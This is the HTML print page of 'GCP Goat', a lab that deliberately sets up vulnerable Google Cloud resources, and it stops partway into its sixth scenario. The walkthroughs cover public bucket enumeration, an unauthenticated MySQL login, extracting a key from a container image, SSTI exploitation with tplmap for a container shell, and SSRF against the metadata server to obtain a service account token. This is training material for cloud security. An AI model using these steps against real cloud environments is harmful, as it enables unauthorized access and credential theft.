<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>GCP Goat</title>
        <meta name="robots" content="noindex" />


        <!-- Custom HTML head -->
        
        <meta name="description" content="GCP-Goat is intentionally vulnerable GCP environment to learn and practice GCP Security">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="about.html"><strong aria-hidden="true">2.</strong> About GCP Goat</a></li><li class="chapter-item expanded "><a href="Getting-Started.html"><strong aria-hidden="true">3.</strong> Getting Started</a></li><li class="chapter-item expanded "><a href="attacking-gcs.html"><strong aria-hidden="true">4.</strong> Attacking GCS</a></li><li class="chapter-item expanded "><a href="attacking-sql.html"><strong aria-hidden="true">5.</strong> Attacking Sql Instance</a></li><li class="chapter-item expanded "><a href="attacking-artifact-registry.html"><strong aria-hidden="true">6.</strong> Attacking Artifact Registry</a></li><li class="chapter-item expanded "><a href="attacking-gke.html"><strong aria-hidden="true">7.</strong> Attacking GKE</a></li><li class="chapter-item expanded "><a href="attacking-app-engine.html"><strong aria-hidden="true">8.</strong> Attacking App Engine</a></li><li class="chapter-item expanded "><a href="privilege-escalation-sa.html"><strong aria-hidden="true">9.</strong> Privilege Escalation Using Service account impersonation</a></li><li class="chapter-item expanded "><a href="wrap-up.html"><strong aria-hidden="true">10.</strong> Wrapping up</a></li><li class="chapter-item expanded "><a href="contributing.html"><strong aria-hidden="true">11.</strong> Contributing to the GCP Goat</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">GCP Goat</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <img src="images/gcp-goat.png" alt="drawing" width="500"/>
<h3 id="looking-for-job--hey-folks-i-am-actively-seeking-job-opportunities-in-roles-related-to-cloud-security-gcp-infrastructure-security-and-devops-if-your-organization-is-currently-hiring-for-such-positions-please-feel-free-to-get-in-touch-with-me-you-can-find-more-details-about-my-qualifications-and-experience-on-my-website"><a class="header" href="#looking-for-job--hey-folks-i-am-actively-seeking-job-opportunities-in-roles-related-to-cloud-security-gcp-infrastructure-security-and-devops-if-your-organization-is-currently-hiring-for-such-positions-please-feel-free-to-get-in-touch-with-me-you-can-find-more-details-about-my-qualifications-and-experience-on-my-website">❗Looking for Job : Hey Folks I am actively seeking job opportunities in roles related to Cloud Security (GCP), Infrastructure Security, and DevOps. If your organization is currently hiring for such positions, please feel free to get in touch with me. You can find more details about my qualifications and experience on my <a href="https://joshuajebaraj.com/">website</a>.</a></h3>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcp-goat"><a class="header" href="#gcp-goat">GCP GOAT</a></h2>
<p>GCP-Goat is intentionally vulnerable GCP environment to learn and practice GCP Security</p>
<h2 id="-disclaimer"><a class="header" href="#-disclaimer">⚠️ Disclaimer</a></h2>
<blockquote>
<p>GCP Goat is the intentionally vulnerable GCP Setup .Don't Deploy this in production Environment </p>
</blockquote>
<blockquote>
<p>GCP Goat comes with absolutely no warranties whatsoever. By using GCP Goat, you take full responsibility for any  outcomes that result.</p>
</blockquote>
<h2 id="about-the-author"><a class="header" href="#about-the-author">About the author</a></h2>
<p>GCP goat was created by <a href="https://www.joshuajebaraj.com/">Joshua Jebaraj</a></p>
<p>Joshua Jebaraj is a cloud native security researcher and his primary area of interest resides around GCP and Kubernetes Security.He had also Spoken at conferences like BlackHat,Hack in the box,Defcon,Owasp-Seasides,Bsides-Delhi and Eko-party When away from the screen he can be found watching movies and making memes</p>
<blockquote>
<p>Note this is the new version of GCP Goat and if you want to check the old version of GCP Goat you can find it <a href="TBD">here</a></p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h2 id="getting-started"><a class="header" href="#getting-started">Getting Started</a></h2>
<p>This tutorial assumes that you have Google Cloud Account with Billing Enabled in order to create the resources need for the Setup</p>
<p>If you have don't have the Google Cloud Account Create one by following the given link <a href="https://console.cloud.google.com/getting-started">Get Started with Google Cloud Platform</a></p>
<p>Go to the <a href="https://console.cloud.google.com">Google-Console</a></p>
<p>Create the new Project by Clicking Select Project</p>
<p><img src="images/setup-1.png" alt="setup-1" /></p>
<p>Create the new Project by Clicking New Project </p>
<p><img src="images/setup-2.png" alt="setup-2" /></p>
<p>Enter a Valid name and click Create</p>
<blockquote>
<p>Please note the project ID for future reference
Once it is done click on the below link to clone the repository</p>
</blockquote>
<p><a href="https://ssh.cloud.google.com/cloudshell/open?cloudshell_git_repo=https://github.com/JOSHUAJEBARAJ/GCP-GOAT">Clone the Repository</a></p>
<p>Tick the <code>Trust Project</code> and click on <code>CONFIRM</code> , It will take few seconds to clone the repository and open the cloud shell</p>
<p>Next export the project id using the below command</p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
</code></pre>
<p>Next configure the project id using the below command</p>
<pre><code class="language-bash">gcloud config set project $PROJECT_ID
</code></pre>
<p>Next enable the necessary services using the below command</p>
<pre><code class="language-bash">gcloud services enable cloudresourcemanager.googleapis.com
</code></pre>
<pre><code class="language-bash">gcloud services enable iam.googleapis.com
</code></pre>
<pre><code class="language-bash">gcloud services enable compute.googleapis.com
</code></pre>
<p>Once it is done navigate into the scenarios directory by executing the below command</p>
<pre><code class="language-bash">cd scenarios
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-google-cloud-storage"><a class="header" href="#attacking-google-cloud-storage">Attacking Google Cloud Storage</a></h2>
<p>In order to start the scenario go to the <code>scenario-1</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">cd scenario-1
</code></pre>
<p>Go into the <a href="https://canarytokens.org/generate#">canary-token</a> and generate the dummy aws creds and copy the value </p>
<p>Now move into the <code>juice-shop</code> folder and create the new file called <code>aws-creds.txt</code> and paste the copied value in the file </p>
<pre><code class="language-bash">cd juice-shop
</code></pre>
<p>Once it is done move back into the <code>scenario-1</code> folder and zip the <code>juice-shop</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">cd ..
</code></pre>
<pre><code class="language-bash">zip -r juice-shop.zip juice-shop/
</code></pre>
<p>Export the <code>PROJECT_ID</code> variable by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
</code></pre>
<p>Now deploy the infrastructure by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">terraform init
</code></pre>
<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID -var unique-name=&lt;BUCKET_NAME&gt;
</code></pre>
<blockquote>
<p>Note the <code>BUCKET_NAME</code> should be unique, if you get the error while deploying the infrastructure change the <code>BUCKET_NAME</code> and try again</p>
</blockquote>
<h3 id="scenario-info"><a class="header" href="#scenario-info">Scenario info</a></h3>
<p>Public-Facing Google Bucket is the most common vulnerability in the <code>GCP</code> environment Users often create the bucket with public access in order to use the data stored in the bucket to be used by external application ,Sometimes this leads leakage of sensitive information</p>
<p>In this scenario we are going to see how to find the public bucket using the TBD name and how to access the data stored in the bucket </p>
<h3 id="solution"><a class="header" href="#solution">Solution</a></h3>
<p>In order to find the public bucket we are going to use the tool called <a href="https://github.com/JOSHUAJEBARAJ/gcp-enum">gcp-enum</a></p>
<p>Install the <code>gcp-enum</code> by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">git clone https://github.com/JOSHUAJEBARAJ/gcp-enum
</code></pre>
<p>Next navigate to the <code>gcp-enum</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">cd gcp-enum
</code></pre>
<p>Now run the <code>gcp-enum</code> by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">go run main.go -k &lt;unique-name&gt; -file short-wordlist -c 10
</code></pre>
<blockquote>
<p>Replace the <code>&lt;unique-name&gt;</code> with the bucket name which you have used while deploying the infrastructure</p>
</blockquote>
<p>You will see one valid bucket name in the output which end with <code>-backup</code></p>
<blockquote>
<p>Note if you find the other bucket name with other than <code>-backup</code> , please ignore it and don't try to access it as it may belong to other users and it may lead to legal issues</p>
</blockquote>
<p>Now try to access the bucket by typing the below url in the browser</p>
<pre><code class="language-bash">http://&lt;unique-name&gt;-backup.storage.googleapis.com/
</code></pre>
<p>For example if the bucket name is <code>gcp-goat-123</code> then the url will be </p>
<pre><code class="language-bash">http://gcp-goat-123-backup.storage.googleapis.com/
</code></pre>
<p>Now on acessing the url you will find the <code>juice-shop.zip</code> file</p>
<p>Let's download the file by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">wget http://&lt;unique-name&gt;-backup.storage.googleapis.com/juice-shop.zip
</code></pre>
<p>Next unzip the file by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">unzip juice-shop.zip
</code></pre>
<p>Now move into the <code>juice-shop</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">cd juice-shop
</code></pre>
<p>Now you will find the <code>aws-creds.txt</code> file in the folder</p>
<h3 id="clean-up"><a class="header" href="#clean-up">Clean up</a></h3>
<p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">cd scenario-1
</code></pre>
<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID -var unique-name=&lt;unique-name&gt; 
</code></pre>
<p>Move into the previous folder by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">cd ..
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-sql-instance"><a class="header" href="#attacking-sql-instance">Attacking SQL Instance</a></h2>
<p>In order to start the scenario go to the <code>scenario-2</code> folder by typing the below  command in the shell</p>
<pre><code class="language-bash">cd scenario-2
</code></pre>
<p>Export the project ID by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
</code></pre>
<blockquote>
<p>replace the <code>project-id</code> with your project ID</p>
</blockquote>
<p>Next configure the <code>gcloud</code> to use the project by typing the below command in the shell </p>
<pre><code class="language-bash">gcloud config set project $PROJECT_ID
</code></pre>
<p>Next enable the <code>Cloud SQL Admin API</code> by typing the below command in the shell </p>
<pre><code class="language-bash">gcloud services enable sqladmin.googleapis.com
</code></pre>
<p>Next initialize the terraform by typing the below command in the shell </p>
<pre><code class="language-bash">terraform init
</code></pre>
<p>Next apply the terraform by typing the below command in the shell </p>
<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID
</code></pre>
<blockquote>
<p>Note This will take some time to create the resources be patient 🧘 </p>
</blockquote>
<p>Once it is done note the ip-address of the <code>SQL Instance</code> from the terraform output</p>
<h3 id="scenario-info-1"><a class="header" href="#scenario-info-1">Scenario info</a></h3>
<p>Google SQL allows developers to set up the database without any hassle by default the database can be accessed only within the authorized network but during debugging the database sometimes the user may open the database to the public for easy debugging In this Scenario the attacker gets to know to about the public-facing SQL Instance</p>
<h3 id="solution-1"><a class="header" href="#solution-1">Solution</a></h3>
<p>First we are going to perform some <code>reconnaissance</code> on the <code>Instance</code> using nmap, in order to do that we need to first install <code>nmap</code> in the <code>GCLOUD Shell</code> by typing the below command in the shell</p>
<pre><code class="language-bash">sudo apt-get install nmap -y
</code></pre>
<p>Next run the nmap scan by typing the below command in the shell</p>
<pre><code class="language-bash">nmap -Pn &lt;SQL INSTANCE IP&gt;
</code></pre>
<p>Running <code>Nmap</code> Scan on the IP reveals that <code>MySQL</code> service  was running on the given instance</p>
<pre><code>mysql -u root -h &lt;ip&gt;
</code></pre>
<blockquote>
<p>Note This scenario assumes there was no authentication for the  database , but in real world may  find some weak credentials </p>
</blockquote>
<p>Enter <code>\q</code> to exit the database</p>
<h3 id="clean-up-1"><a class="header" href="#clean-up-1">Clean up</a></h3>
<p>To clean up the <code>Scenario</code> type the below  command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-artifact-registry"><a class="header" href="#attacking-artifact-registry">Attacking Artifact Registry</a></h2>
<p>In order to start the scenario go to the <code>scenario-3</code> folder by typing the below  command in the shell</p>
<pre><code class="language-bash">cd scenario-3
</code></pre>
<p>Export the project ID by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
</code></pre>
<blockquote>
<p>replace the <code>project-id</code> with your project ID</p>
</blockquote>
<p>Next configure the <code>gcloud</code> to use the project by typing the below command in the shell </p>
<pre><code class="language-bash">gcloud config set project $PROJECT_ID
</code></pre>
<p>Next enable the <code>Artifact Registry</code> api by typing the below command in the shell </p>
<pre><code class="language-bash">gcloud services enable artifactregistry.googleapis.com
</code></pre>
<p>Next initialize the terraform by typing the below command in the shell </p>
<pre><code class="language-bash">terraform init
</code></pre>
<p>Next apply the terraform by typing the below command in the shell </p>
<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID
</code></pre>
<p>Next output the service account key by typing the below command in the shell </p>
<pre><code class="language-bash">terraform output -raw sa-key &gt; creds.json
</code></pre>
<p>Next login into the <code>artifact registry</code> by typing the below command in the shell </p>
<pre><code class="language-bash">gcloud auth configure-docker us-central1-docker.pkg.dev
</code></pre>
<p>Next build and push the image using the below command </p>
<pre><code class="language-bash">docker build -t us-central1-docker.pkg.dev/$PROJECT_ID/gcp-goat/secret:latest .
</code></pre>
<pre><code class="language-bash">docker push us-central1-docker.pkg.dev/$PROJECT_ID/gcp-goat/secret:latest
</code></pre>
<h2 id="scenario-info-2"><a class="header" href="#scenario-info-2">Scenario info</a></h2>
<p>According to the google docs </p>
<blockquote>
<p>Artifact Registry provides a single location for managing private packages and Docker container images.</p>
</blockquote>
<p>Even though the <code>Artifact Registry</code> is private by default, sometimes users make the <code>Artifact Registry</code> public in order to use the packages and docker images in the external application, this leads to the leakage of sensitive information</p>
<p>In this scenario, we are going to see download the docker image from the <code>Artifact Registry</code> and extract the sensitive information from the docker image</p>
<h2 id="solution-2"><a class="header" href="#solution-2">Solution</a></h2>
<blockquote>
<p>Note: This scenario assumes that we have somehow able to find the project name and repo name</p>
</blockquote>
<p>On your local machine , try to pull the docker image by typing the below command in the shell </p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
</code></pre>
<pre><code class="language-bash">docker pull us-central1-docker.pkg.dev/$PROJECT_ID/gcp-goat/secret:latest
</code></pre>
<p>Once the image is pulled, try to extract the sensitive information from the image by typing the below command in the shell </p>
<pre><code class="language-bash">docker run --rm -it us-central1-docker.pkg.dev/$PROJECT_ID/gcp-goat/secret:latest sh
</code></pre>
<p>Next try to list the files in the <code>/</code> directory by typing the below command in the shell </p>
<pre><code class="language-bash">ls 
</code></pre>
<p>On executing the above command you will find the file called <code>creds.json</code> which contains the service account key</p>
<p>Now using the service account key we can access the <code>GCP</code> resources</p>
<blockquote>
<p>Note for security reasons , the service account does not have any permission to access the resources, but in the real world, the service account will have the permission to access the resources</p>
</blockquote>
<h2 id="clean-up-2"><a class="header" href="#clean-up-2">Clean up</a></h2>
<p>In order to clean up the infrastructure, type the below command in the shell </p>
<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-google-kubernetes-engine"><a class="header" href="#attacking-google-kubernetes-engine">Attacking Google Kubernetes Engine</a></h2>
<p>Inorder to start the scenario go to the <code>scenario-4</code> folder by typing the below command in the <code>GCLOUD SHELL</code></p>
<pre><code class="language-bash">cd scenario-4
</code></pre>
<blockquote>
<p>Note this scenarios requires you to run the both terraform and bash script </p>
</blockquote>
<p>First export the project id using the below command </p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
</code></pre>
<pre><code class="language-bash">export PROJECT_NUMBER=$(gcloud projects describe $PROJECT_ID --format=&quot;value(projectNumber)&quot;)
</code></pre>
<p>Next deploy the k8s cluster using the below command</p>
<pre><code class="language-bash">gcloud services enable container.googleapis.com
</code></pre>
<pre><code class="language-bash">gcloud container clusters create gcp-goat-cluster \
    --workload-pool=$PROJECT_ID.svc.id.goog --machine-type=n1-standard-1 \
    --num-nodes=2 --zone &quot;asia-east1-a&quot;
</code></pre>
<p>Now configure the <code>kubectl</code> to use the cluster by typing the below command</p>
<pre><code class="language-bash">gcloud  container clusters get-credentials gcp-goat-cluster --zone &quot;asia-east1-a&quot;
</code></pre>
<blockquote>
<p>Note : It takes too long in order to setup the <code>kubernetes cluster</code> so be patient 🧘‍♂️</p>
</blockquote>
<p>Once it is done create the namespace and kubernetes service account by typing the below command</p>
<pre><code class="language-bash">kubectl create namespace test
</code></pre>
<pre><code class="language-bash">kubectl create serviceaccount k8s-sa \
    --namespace test
</code></pre>
<p>Next deploy the necessary resources by typing the below command</p>
<pre><code class="language-bash">terraform init
</code></pre>
<pre><code class="language-bash">terraform apply -auto-approve -var project-id=$PROJECT_ID -var project_number=$PROJECT_NUMBER
</code></pre>
<p>Once it is done update the annotations of the <code>k8s-sa</code> service account by typing the below command</p>
<pre><code class="language-bash">kubectl annotate serviceaccount \
    --namespace test k8s-sa \
    iam.gke.io/gcp-service-account=gcp-goat@$PROJECT_ID.iam.gserviceaccount.com
</code></pre>
<p>Deploy the application using the below command </p>
<pre><code class="language-bash">kubectl apply -f app.yaml -n test 
</code></pre>
<h3 id="scenario-info-3"><a class="header" href="#scenario-info-3">Scenario info</a></h3>
<p>According to the Official docs </p>
<blockquote>
<p>Workload Identity allows a Kubernetes service account in your GKE cluster to act as an IAM service account. Pods that use the configured Kubernetes service account automatically authenticate as the IAM service account when accessing Google Cloud APIs. Using Workload Identity allows you to assign distinct, fine-grained identities and authorization for each application in your cluster.</p>
</blockquote>
<p>In this scenario, we will deploy a vulnerable application to a Kubernetes cluster that has Workload Identity enabled. We will then exploit a vulnerability in the application and get the shell in the container, from there we will use the service account associated with the pod to perform the privilege escalation </p>
<p>The application we were deployed is exposed via the node port on the port <code>30003</code></p>
<p>First find the ip address of the node in order to access the application via nodeport by typing the below command</p>
<pre><code class="language-bash">kubectl get nodes -o wide
</code></pre>
<blockquote>
<p>Note the ip address of the node</p>
</blockquote>
<p>Verify the application is running by typing the below command </p>
<pre><code class="language-bash">kubectl get pods -n test
</code></pre>
<p>Next try to access the application by accessing the below url in the browser</p>
<pre><code class="language-bash">http://&lt;node-ip&gt;:30003/page
</code></pre>
<p>The application that we deployed is vulnerable to <code>Server Side Template Injection</code> we are going to exploit it to get the shell in the container</p>
<p>We can verify that by typing the below payload in the <code>name</code> parameter by entering the below payload in the search box and click on the Generate page </p>
<pre><code class="language-bash">{{7*7}}
</code></pre>
<p>You can see the output as <code>49</code> which means the application is vulnerable to <code>Server Side Template Injection</code></p>
<p>Next we are going to use the <code>tplmap</code> tool to exploit the <code>Server Side Template Injection</code> vulnerability </p>
<p>In order to do that , first clone the tplmap repository by typing the below command in the <code>GCLOUD SHELL</code></p>
<pre><code class="language-bash">git clone https://github.com/epinna/tplmap.git
</code></pre>
<p>Next move into the directory by typing the below command in the terminal</p>
<pre><code class="language-bash">cd tplmap 
</code></pre>
<p>Next execute the below command to exploit the <code>Server Side Template Injection</code> vulnerability </p>
<pre><code class="language-bash">python3 tplmap.py -u http://&lt;node-ip&gt;:30003/page?name=gcp-goat --os-shell
</code></pre>
<p>You will get the shell in the container</p>
<p>Now we can use the <code>service account</code> associated with the pod to perform the privilege escalation</p>
<p>For example lets' try to list down the buckets in the project by typing the below command in the terminal</p>
<pre><code class="language-bash">gsutil ls
</code></pre>
<p>You can find the list of buckets in the project</p>
<p>Since the service account has the <code>Editor</code> role we can perform as many actions as we want</p>
<p>If you are interested more on the <code>Kubernetes</code> I highly recommend to check out <a href="https://madhuakula.com/kubernetes-goat">Kubernetes-Goat</a></p>
<h3 id="clean-up-3"><a class="header" href="#clean-up-3">Clean up</a></h3>
<p>Exit from the os-shell by pressing <code>Ctrl + C</code></p>
<p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD SHELL</code></p>
<pre><code class="language-bash">gcloud container clusters delete   gcp-goat-cluster --zone &quot;asia-east1-a&quot; -q 
</code></pre>
<blockquote>
<p>Make sure to delete the kubernetes cluster before deleting the terraform resources</p>
</blockquote>
<pre><code class="language-bash">cd scenario-4
</code></pre>
<pre><code class="language-bash">terraform destroy -auto-approve -var project-id=$PROJECT_ID -var project_number=$PROJECT_NUMBER
</code></pre>
<p>Move into the previous folder by typing the below command in the <code>GCLOUD SHELL</code></p>
<pre><code class="language-bash">cd ..
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="attacking-google-app-engine"><a class="header" href="#attacking-google-app-engine">Attacking Google App Engine</a></h2>
<blockquote>
<p>Note please execute this scenario as the last scenario because it requires you to delete the project in order to clean up the resources</p>
</blockquote>
<p>In order to start the scenario go to the <code>scenario-5</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
<p>First export the project id using the below command </p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
</code></pre>
<p>Next configure the <code>gcloud</code> to use the project by typing the below command</p>
<pre><code class="language-bash">gcloud config set project $PROJECT_ID
</code></pre>
<p>Next enable the <code>App Engine</code> API by typing the below command</p>
<pre><code class="language-bash">gcloud services enable appengine.googleapis.com
</code></pre>
<p>Next deploy the <code>App Engine</code> by typing the below command</p>
<pre><code class="language-bash">gcloud app deploy
</code></pre>
<blockquote>
<p>Select the region you want to deploy and press <code>Y</code> to continue</p>
</blockquote>
<p>Once it is done you can find the application url by typing the below command</p>
<pre><code class="language-bash">gcloud app browse
</code></pre>
<h2 id="scenario-info-4"><a class="header" href="#scenario-info-4">Scenario Info</a></h2>
<p>According to the <a href="https://en.wikipedia.org/wiki/Google_App_Engine">Wikipedia</a></p>
<p><strong>Google App Engine (often referred to as GAE or simply App Engine) is a Platform as a Service and cloud computing platform for developing and hosting web applications in Google-managed data centers. Applications are sandboxed and run across multiple servers. App Engine offers automatic scaling for web applications—as the number of requests increases for an application, App Engine automatically allocates more resources for the web application to handle the additional demand.</strong></p>
<p>By default the <code>App Engine</code> is deployed with the <code>default</code> app engine service account which has the <code>Editor</code> role in the project</p>
<p>In this scenario we are going to exploit the <code>SSRF</code> vulnerability in the deployed application and use the <code>Metadata Server</code> to get the service account token</p>
<h3 id="solution-3"><a class="header" href="#solution-3">Solution</a></h3>
<p>First Let's try to access the <code>Metadata endpoint</code> that gives you the information about the project id by typing the below payload in the <code>URL</code> field</p>
<pre><code class="language-bash">http://metadata.google.internal/computeMetadata/v1/project/project-id
</code></pre>
<p>Under the <code>Headers</code> section add the below header</p>
<pre><code class="language-bash">Metadata-Flavor: Google
</code></pre>
<p>And click on <code>CHECK STATUS</code> button and you can find the project id in the response</p>
<p>Next try to access the <code>Metadata endpoint</code> that gives you the information about the service account token by typing the below payload in the <code>URL</code> field</p>
<pre><code class="language-bash">http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
</code></pre>
<p>You can find the <code>access_token</code> in the response and you can use this token to perform the privilege escalation in the project</p>
<blockquote>
<p>Note In recent version Compute Engine SSRF is only possible if you able to pass the <code>headers</code> as <code>Metadata-Flavor: Google</code> </p>
</blockquote>
<h3 id="clean-up-4"><a class="header" href="#clean-up-4">Clean up</a></h3>
<p>According to the google , there is no way to delete the <code>App Engine</code> service account so you have to delete the project in order to clean up the resources</p>
<p>So we recommend you to delete the project after completing the scenario</p>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ol>
<li>
<p>In order to learn more about <code>SSRF</code> in Google Cloud I highly recommend to check out <a href="https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/">Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments</a>  by <a href="https://about.gitlab.com/company/team/#init_string">Chris Moberly</a></p>
</li>
<li>
<p>More details about the meta-data endpoint <a href="https://hackingthe.cloud/gcp/general-knowledge/metadata_in_google_cloud_instances/">link</a></p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="privilege-escalation-using-service-account-impersonation"><a class="header" href="#privilege-escalation-using-service-account-impersonation">Privilege Escalation Using Service account impersonation</a></h2>
<p>In order to start the scenario go to the <code>scenario-6</code> folder by typing the below  command in the shell</p>
<pre><code class="language-bash">cd scenario-6
</code></pre>
<p>Export the project ID by typing the below command in the <code>GCLOUD Shell</code></p>
<pre><code class="language-bash">export PROJECT_ID=&quot;project-id&quot;
